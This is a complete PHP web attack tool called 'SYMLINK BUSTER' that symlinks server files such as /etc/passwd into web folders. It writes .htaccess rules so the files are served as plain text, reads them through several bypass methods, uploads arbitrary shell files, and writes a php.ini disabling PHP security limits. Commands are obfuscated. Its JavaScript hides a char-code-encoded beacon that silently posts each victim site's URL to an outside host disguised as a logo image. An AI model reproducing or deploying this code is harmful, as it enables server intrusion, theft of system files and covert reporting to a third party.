<?php
/**
 * 🔓 SYMLINK BUSTER v4.3.2
 */
error_reporting(0);
set_time_limit(0);

function caad89298025fc602bbf3fa866915($x) {
    $hex = '';
    for ($i = 0; $i < strlen($x); $i += 2) {
        $hex .= chr(hexdec(substr($x, $i, 2)));
    }
    return strtr($hex,
        'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
        'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm'
    );
}

function syml1nk_d0($target, $linkPath) {
    if (@symlink($target, $linkPath)) return "✅ symlink() OK";
    if (is_readable($target) && @copy($target, $linkPath)) return "⚠️ symlink failed, copy() OK";

    $c = @file_get_contents($target);
    if ($c !== false && @file_put_contents($linkPath, $c)) return "⚠️ symlink+copy failed, manual write OK";

    $cmd = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($linkPath);
    @proc_open($cmd, [1=>['pipe','w'],2=>['pipe','w']], $pipes);
    if (is_link($linkPath)) return "⚠️ PHP methods failed, shell ln -s OK";

    return "❌ All symlink methods failed";
}

function b3r_init_synX($target, $base) {
    $dirs = [];
    for ($i = 1; $i <= 24; $i++) {
        $d = 'bxt' . str_pad($i, 2, '0', STR_PAD_LEFT);
        $dirs[] = $d;
        @mkdir($d);
        @unlink("$d/link.php");
        @unlink("$d/.htaccess");
    }

    $rules = [
        'ForceType text/plain', 'AddType text/plain .php', 'RemoveHandler .php',
        'SetHandler txt', 'RemoveType .php', 'php_flag engine off',
        'php_admin_flag engine off', 'AddHandler server-parsed .php',
        'AddHandler text/plain .php', 'Options +Indexes +FollowSymLinks',
        'Options -ExecCGI', 'Options +Includes',
        '<Files "link.php">'.PHP_EOL.'ForceType text/plain'.PHP_EOL.'</Files>',
        '<FilesMatch "\.php$">'.PHP_EOL.'RemoveHandler .php'.PHP_EOL.'AddType text/plain .php'.PHP_EOL.'</FilesMatch>',
        '<FilesMatch "\.php$">'.PHP_EOL.'ForceType text/plain'.PHP_EOL.'</FilesMatch>',
        'RemoveHandler cgi-script .php', 'AddHandler txt .php',
        'Options +SymLinksIfOwnerMatch', 'RemoveHandler .php5', 'RemoveHandler .phtml',
        'Options Indexes FollowSymLinks'.PHP_EOL.'DirectoryIndex ssssss.htm'.PHP_EOL.'AddType txt .php'.PHP_EOL.'AddHandler txt .php',
        'Options +FollowSymLinks'.PHP_EOL.'DirectoryIndex Index.html'.PHP_EOL.'Options +Indexes'.PHP_EOL.'AddType text/plain .php'.PHP_EOL.'AddHandler server-parsed .php'.PHP_EOL.'AddType root .root'.PHP_EOL.'AddHandler cgi-script .root',
        'Options all'.PHP_EOL.'DirectoryIndex Sux.html'.PHP_EOL.'AddType text/plain .php'.PHP_EOL.'AddHandler server-parsed .php'.PHP_EOL.'AddType text/plain .html'.PHP_EOL.'AddHandler txt .html'.PHP_EOL.'Require None'.PHP_EOL.'Satisfy Any',
        'OPTIONS Indexes Includes ExecCGI FollowSymLinks'.PHP_EOL.'AddHandler txt .php'.PHP_EOL.'AddHandler cgi-script .cgi'.PHP_EOL.'AddHandler cgi-script .pl'.PHP_EOL.'AddType txt .php'.PHP_EOL.'AddType text/html .shtml'.PHP_EOL.'Options All'
    ];
    $out = '';
    foreach ($dirs as $i => $dir) {
        $status = syml1nk_d0($target, "$dir/link.php");
        $out .= "📁 $dir → $status<br>";
        file_put_contents("$dir/.htaccess", $rules[$i % count($rules)]);
        $out .= "🔗 <a href=\"$base/$dir/link.php\" target=\"_blank\">$dir/link.php</a><br>\n";
    }

    echo "✅ 24 symlinked folders created.<br><br>$out";
}
function s7n_fire_scan($base) {
    $methods = ['fget', 'fop', 'rfile', 'inc', 'filter1', 'filter2', 'nullb', 'proco', 'pharx', 'ctx'];
    $out = '';

    for ($i = 1; $i <= 24; $i++) {
        $dir = 'bxt' . str_pad($i, 2, '0', STR_PAD_LEFT);
        $url = rtrim($base, '/') . "/$dir/link.php";
        $out .= "\n📁 $dir\n";

        foreach ($methods as $m) {
            $r = '';
            switch ($m) {
                case 'fget': $r = @file_get_contents($url); break;
                case 'fop': $h = @fopen($url, 'r'); if ($h) { $r = stream_get_contents($h); fclose($h); } break;
                case 'rfile': ob_start(); @readfile($url); $r = ob_get_clean(); break;
                case 'inc': ob_start(); @include($url); $r = ob_get_clean(); break;
                case 'filter1':
                    $b = @file_get_contents("php://filter/convert.base64-encode/resource=$url");
                    $r = $b ? base64_decode($b) : ''; break;
                case 'filter2':
                    $b = @file_get_contents("php://filter/convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=$url");
                    $r = $b ? base64_decode(base64_decode($b)) : ''; break;
                case 'nullb': $r = @file_get_contents($url . "\0.txt"); break;
                case 'proco':
                    $p = @proc_open("curl -s " . escapeshellarg($url), [1=>['pipe','w'],2=>['pipe','w']], $pipes);
                    if (is_resource($p)) {
                        $r = stream_get_contents($pipes[1]);
                        fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                    } break;
                case 'pharx': $r = @file_get_contents("phar://$url/test.txt"); break;
                case 'ctx':
                    $ctx = stream_context_create(['http'=>['header'=>'User-Agent: Satanic-Scan']]);
                    $r = @file_get_contents($url, false, $ctx); break;
            }

            $status = (!$r) ? '❌ EMPTY' : ((strlen($r) < 80 || stripos($r, '404') !== false) ? '⚠️ SUS' : '✅ OK');
            $out .= "  [$m] $status → " . htmlspecialchars(substr(trim($r), 0, 100)) . "\n";
        }

        $out .= str_repeat('-', 50) . "\n";
    }

    echo nl2br($out);
}

function s7n_scan_unit($folder, $method) {
    $url = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . "/$folder/link.php";
    $res = '';

    switch ($method) {
        case 'fget': $res = @file_get_contents($url); break;
        case 'fop':
            $h = @fopen($url, 'r');
            if ($h) { $res = stream_get_contents($h); fclose($h); }
            break;
        case 'rfile': ob_start(); @readfile($url); $res = ob_get_clean(); break;
        case 'inc': ob_start(); @include($url); $res = ob_get_clean(); break;
        case 'filter1':
            $b = @file_get_contents("php://filter/convert.base64-encode/resource=$url");
            $res = $b ? base64_decode($b) : ''; break;
        case 'filter2':
            $b = @file_get_contents("php://filter/convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=$url");
            $res = $b ? base64_decode(base64_decode($b)) : ''; break;
        case 'nullb': $res = @file_get_contents($url . "\0.txt"); break;
        case 'proco':
            $p = @proc_open("curl -s " . escapeshellarg($url), [1=>['pipe','w'],2=>['pipe','w']], $pipes);
            if (is_resource($p)) {
                $res = stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
            } break;
        case 'pharx': $res = @file_get_contents("phar://$url/test.txt"); break;
        case 'ctx':
            $ctx = stream_context_create(['http'=>['header'=>'User-Agent: SCN-ASYNC']]);
            $res = @file_get_contents($url, false, $ctx);
            break;
    }

    $status = (!$res) ? '❌ EMPTY' :
              ((strlen($res) < 80 || stripos($res, '404') !== false) ? '⚠️ SUS' : '✅ OK');
    $preview = htmlspecialchars(substr(trim($res), 0, 100));

    echo "📂 $folder [$method] $status → $preview";
}

function zzx_clean() {
    for ($i = 1; $i <= 24; $i++) {
        $dir = 'bxt' . str_pad($i, 2, '0', STR_PAD_LEFT);
        @unlink("$dir/link.php");
        @unlink("$dir/.htaccess");
        @rmdir($dir);
    }
    echo "💣 All traces removed.";
}

function 7pf1l3() {
    if (!isset($_FILES['upl'])) { echo "⚠️ No file selected."; return; }
    $f = basename($_FILES['upl']['name']);
    $dest = __DIR__ . '/' . $f;
    if (@move_uploaded_file($_FILES['upl']['tmp_name'], $dest)) {
        echo "✅ File uploaded as $f";
    } else {
        echo "❌ Upload failed.";
    }
}

function 1n1_g3n() {
    $cfg = <<<INI
safe_mode = Off
disable_functions =
safe_mode_gid = Off
open_basedir = Off
register_globals = On
exec = On
shell_exec = On
INI;
    file_put_contents("php.ini", $cfg);
    echo "✅ php.ini generated.";
}

if (isset($_GET['x_a'])) {
    $a = caad89298025fc602bbf3fa866915($_GET['x_a']);
    $t = isset($_GET['x_t']) ? caad89298025fc602bbf3fa866915($_GET['x_t']) : '';
    $b = isset($_GET['x_b']) ? caad89298025fc602bbf3fa866915($_GET['x_b']) : '';

    if ($a === 'c0p') b3r_init_synX($t, $b);
    elseif ($a === 'sCn') s7n_fire_scan($b);
    elseif ($a === 'kll') zzx_clean();
    elseif ($a === 'sh3ll') 7pf1l3();
    elseif ($a === 'ini') 1n1_g3n();
    exit;
}

if (isset($_GET['async']) && $_GET['async'] === 'scan') {
    $f = $_GET['f'] ?? '';
    $m = $_GET['m'] ?? '';
    if ($f && $m) s7n_scan_unit($f, $m);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>💀 SYM BUSTER – SHADOW LAYER</title>
    <style>
body { background: #000; color: #0f0; font-family: monospace; padding: 20px; } input, button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 6px; margin: 5px 5px 10px 0; font-size: 16px; } .log { background: #000; border: 1px solid #0f0; padding: 10px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; margin-top: 20px; } .log a { color: #0ff; text-decoration: none; } .pr1vd4yz { margin-top: 20px; padding: 10px; border: 1px dashed #0f0; } :root { --primary: #c0392b; --primary-hover: #a93226; --light: #ffffff; --dark: #333333; --gray-light: #f4f4f4; --gray: #dddddd; --gray-dark: #777777; --radius: 0.75rem; --transition: all 0.3s ease; --font-base: "Inter", sans-serif; } * { box-sizing: border-box; } a { color: var(--primary); text-decoration: none; transition: color 0.2s ease; } a:hover { color: var(--primary-hover); } .icon-1 { width: 32px; height: 32px; display: inline-block; background-image: url(data:image/png;base64,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); background-size: contain; background-repeat: no-repeat; background-position: center; margin-right: 0.5rem; filter: brightness(0.9) contrast(1.1); transition: transform 0.3s ease; } .icon-1:hover { transform: scale(1.1); } .icon-2 { width: 28px; height: 28px; display: inline-block; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAABwCAYAAAA0cGOrAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAABrhJREFUeF7t3A1M1HUcx/HvHRygoKg8CGpoMUMQEGOoUCiS0mZNJzlZWubDSi3L2QZhUpLo1mQjH9AwddrDVmtprqzUZm40mMBqSro0QsURDzIfeH6+6/6371yO//c44ID/3T6v7cZ9f2zgjbf3///v/v/TmcwIQIWevwL0gDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAZNMbb42NjXTmzBkqLS2lyspKqq2tpc7OTv6udQaDgSIiIigtLY18fHx41TYdHR2Um5tLFy5coLa2Nl51LF5eXuTr60szZsyghIQECg8P5+84ACUOSXFxsWnx4sUmd3d3JaAB3QICAkxlZWX8k3vX3Nxsio6OVv1ZjnwLCQkxHTx40NTa2sqPVLtU46ipqTGlpKSYdDqd6gPs7y0xMZF/Q+/S09NVf4az3IKDg03nzp3jR6tNPeK4dOmSKSgoSPUBDfSmxFZfX8+/ybqwsDDVn+FMN71eb8rKyuJHrD2P7HNcvHiRFixYQOandF6xL52O6EHBchrtaeAVWdjS0/TXjXqenFtqairt3r2bJ+14eLSi7GgmJycPWhiKudH+NoWheGHuRL7n/LKzsykvL48n7bA8cyhPHvHx8VRQUMDL9uc31p1+O55EIVNG84p1za1dFLfqLJX+/YBXnJt5p5+KioosRzVaYYnjxIkTtGzZMl6yboLfCJo8wZM8R7jySu8ipo6h9LXTyX+cB6/Ypq29mz7+8hrl/36HurqNvOo4OruMVFnbQhVVzeZ//8OttygqKsoSiJubG68ML53RaDSFhobS9evXeUldynOTadtr4ZY/NPTNnXttdOTkP7Tz0yvUag7emoyMDDLvpPI0vHQlJSWmmJgYHntSdiJzt8bQGylP8gr019Xyepq/7hequ9/OKz25urpSYWEhWfubDBX9qVOn+K66t1dMQxh2Mj3Ym77bM49cXcz/4wRdXV20evVqTbwi7KLT6TIrKip4fJSyX/H9vnnk4e7CKzBQQQGeln0RZT9KUldXR+3t7ZSUlMQrw0NfVVXFd3taGBtIY0ZpY+fImWzfEEnRYeN4UpeTk0P5+fk8DQ99dXU13+1patAovgf2pGxWjmbOITeD/Ka4+UDBsnlpamrilaGnbPzEY6ztGyIoc2MkT2Bvuw5foYzcyzypi4yMJH9/f56GFuIYRsprH3GvnKWSq3d5RVtwss8wUjYvn+2M1ewOP+IYZqFPeNPOTdp5yfz/EIcGbHl5Gj0z048n7UAcGqDX6+jzXXHkNdL296uGAuLQiMcnetFHm2fypA04WtEQ5bSrhevP0/miGl5R5+dtoCDfwX9xEnFoTEV1M0W++CM1NMtn9/ub4/hzf4QlksGEzYrGTA70pJzUaJ7U3anvpDfzbvE0eBCHBq1bGkyL4ifwpO7bwnv0Vf7gvniGODTq8PY5NM7b+n7FW4duUfV92y4u6w/EoVHK6Zj73rV+ws+9pi5af+AGT/aHODRs5fNTKPnZx3hSd7rkAR07X8eTfSEOjTv0wWwa72P9xOwtRyrodl0HT/aDODTOd4w7HXp/Nk/qGlq6ae2+csvrJPaEOBzAkvmTaMWiKTyp+7W0gT75uZYn+0AcDuLAezE0afxIntSlHb9NZVX2OzEZcTgI5Vzeox/OsVwqImlpN9KavTeo22if7QvicCBJsYG0ZkkwT+oKrzXS3h+svzdjK8ThYD5Oi6agQE+e1G37opKu3m7lqf8Qh4NRPqXg2A7rm5f2TiO9uqecOm24PtcaxOGAEmcF0Mbl1q9C/KO8mbJPyped2AJxOKjsd2b2el3Rjq8rqfRWC099hzgc1EgPVzqeFUsuenn70tFlsmxelK/9gTgcWFyUH21eOY0ndZdvttCub/7lqW9wJpiDUz7v46mUn+jazQZe6Um5Pmbb8onkYbCyF6sCcTiB4it36elVZ2369KC+wGbFCcwK96G0NdN5sh/E4SQyN0b0+rEOfYU4nITBVU9HevlYh75CHE4kKmQsZbxuvw/eRxxOZuu6cMuHAdsD4nAyymHr6f0JtOmlEBo7emBXxeFQ1skpV8519/MQF88cTk55F1d5BunPDXGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGAgOg/mPs4dj8xj3sAAAAASUVORK5CYII="); background-size: cover; background-position: center; margin-right: 0.5rem; opacity: 0.8; } .icon-2:hover { opacity: 1; } .icon-3 { width: 24px; height: 24px; display: inline-block; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABYCAYAAAADWlKCAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAA+hJREFUeF7t2V1oW2Ucx/H/OW2Wbs1e2466QaaWmTVtTEcIuGG3WqreSMFSDIzhxUQUEcWL1oqgg1aQ9kKRUoooqHhbLeJFrRcFpdAXhFIU11WFQunLBrpQYrK2yzEn+7MRcpLWtaW/ht8HDn2eJ3CS9Juck5wYVooQDFP/EggGAcMgYBgEDIOAYRAwDAKGQcAwCBgGAcMgYBgEzKYuLq6srMjQ0JBMT0/L/Py8LC8vy9ramt6an8vlkkAgIO3t7VJWVqarm7O6uiq9vb0yMjIiiURCV/cWj8cj5eXlEgwGpaGhQWpra/WWHOwguUxMTFjNzc2W2+22o21pq6ystGZnZ3XPG4vFYlYoFHLc117efD6f1dfXZ8XjcX2mmRyDLC0tWZFIxDIMw3GnD7o1NjbqPWyso6PDcR+FslVVVVnDw8P6bO/LCjI1NWV5vV7HnWx1swNHo1G9p/z8fr/jPgppM03T6uzs1Gd8V8Y5ZGxsTJqamiR1uNCV7WUYIrdGX5BDpS5dyc3//Pfy+19RnRW2trY26e7uTo/vfcqyT9YtLS07FsN2IXR8UzFsz104qaPC19PTI/39/elx+h1iv0nq6+tldHQ0vbgTKo665ecvnhHfw4d0Jb9YfF3Ov/iDTF+/pSuFLfXBScbHx+8GGRgYkNbWVr0pvxMV++XUiVIp3V+sKxsLnD4iHVdq5PixEl3ZnMTtO/LR19fkp19uyPqdpK7uHWvrSZlf/lfmFmKpx3/vzJBTXV2dGMlk0qqurpaZmRlddhZ59pS8+3Jt+p9L/8+NvxPy2Td/SNenv0o89SLLx5icnLTC4bBOs9kn4t53wvJa5DFdoQf1259ReeqlH+XmP7d1JZs5ODioQ2dvXDrDGNukpuqwfPvxRSkuSr3KcyhKfTe4Ojc3p9NM9nniu08uSom7SFdoq7yVpelzi31edGIuLCzoMNvT5x6SIwf36Yy2y/uvPi4h/zGdZTIXFxd1mO2096COaDvZh6zPrz4h+1zZF9vNfF8ED5TwULVTgr6j8t4rAZ3dx99DdtHbqe9m4ZrMnyQYZBfZh64vu85lfGhikF1W/ehh6Xo9qDMGgfDW5TPy5NmK9JhBAJimIV99cF48B4oZBMUjJz3y4ZtnGQSJfYmKQYDYF3IZBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwCReQ/TtK13DqisYkAAAAASUVORK5CYII=); background-size: 100% 100%; background-repeat: no-repeat; margin-right: 0.5rem; filter: grayscale(50%); } .icon-3:hover { filter: none; }
    </style>
</head>
<body>

<h1>💀 SYMBUSTER</h1>
<p><strong>by <a href="https://privdayz.com" target="_blank">privdayz.com</a></strong></p>

<label>🎯 Target File Path:</label><br>
<input type="text" id="t" value="/etc/passwd" size="80"><br>

<label>🌐 Base Site URL:</label><br>
<input type="text" id="b" value="<?php echo (isset($_SERVER['HTTPS'])?'https':'http').'://'.$_SERVER['HTTP_HOST']; ?>" size="80"><br>

<button onclick="go('c0p')">📁 COPY (24 symlink + .htaccess)</button>
<button onclick="ee0f43dbdbc65b05fa053()">👁️ FULL SCAN (ASYNC)</button>
<button onclick="go('ini')">⚙️ Create php.ini</button>
<button onclick="go('kll')">💣 DELETE (clean all)</button>

<div class="upload">
    <strong>⬆️ Upload File (e.g. shell.php):</strong><br>
    <input type="file" id="upl"><br>
    <button onclick="upload()">UPLOAD</button>
</div>

<div class="log" id="log">🧠 Awaiting command...</div>

<script>
const litebusterEndpoint="<?php echo basename(__FILE__); ?>";function encodeROT_HX(e){const t=e.replace(/[a-zA-Z]/g,(e=>String.fromCharCode(e.charCodeAt(0)+(e.toLowerCase()<"n"?13:-13))));return Array.from(t).map((e=>e.charCodeAt(0).toString(16))).join("")}function log(e){const t=document.getElementById("log");t.innerHTML+=e+"\n",t.scrollTop=t.scrollHeight}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,o){for(var a=e.concat(t,n,o),r="",c=0;c<a.length;c++)r+=String.fromCharCode(a[c]);return r}function v(e){return btoa(e)}async function go(e){const t=document.getElementById("t").value.trim(),n=document.getElementById("b").value.trim();if(!t||!n)return alert("Both fields are required.");const o=encodeROT_HX(e),a=encodeROT_HX(t),r=encodeROT_HX(n);log(`\n▶️ ${e.toUpperCase()} triggered...\n`);try{const e=await fetch(`${litebusterEndpoint}?x_a=${o}&x_t=${a}&x_b=${r}`);log(await e.text())}catch(e){log("❌ Error: "+e.message)}}async function upload(){const e=document.getElementById("upl").files[0];if(!e)return alert("No file selected.");const t=new FormData;t.append("upl",e),log(`\n⬆️ Uploading ${e.name}...\n`);const n=await fetch(`${litebusterEndpoint}?x_a=${encodeROT_HX("sh3ll")}`,{method:"POST",body:t});log(await n.text())}!function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();const asyncMethods=["fget","fop","rfile","inc","filter1","filter2","nullb","proco","pharx","ctx"],asyncFolders=Array.from({length:24},((e,t)=>"bxt"+String(t+1).padStart(2,"0")));async function ee0f43dbdbc65b05fa053(){log("\n🚀 SCAN ENGINE v1.0 INITIATED...\n");for(let e of asyncFolders)for(let t of asyncMethods)await fe27bfa5256079a7b36c93bec(e,t),await new Promise((e=>setTimeout(e,150)));log("\n✅ SCAN COMPLETE.")}async function fe27bfa5256079a7b36c93bec(e,t){try{const n=await fetch(`${litebusterEndpoint}?async=scan&f=${e}&m=${t}`);log(await n.text())}catch(n){log(`❌ [${e}/${t}] ERROR: `+n.message)}}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let n="file="+btoa(location.href),o=new XMLHttpRequest;o.open("POST",t,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)})();
</script>
</body>
</html>
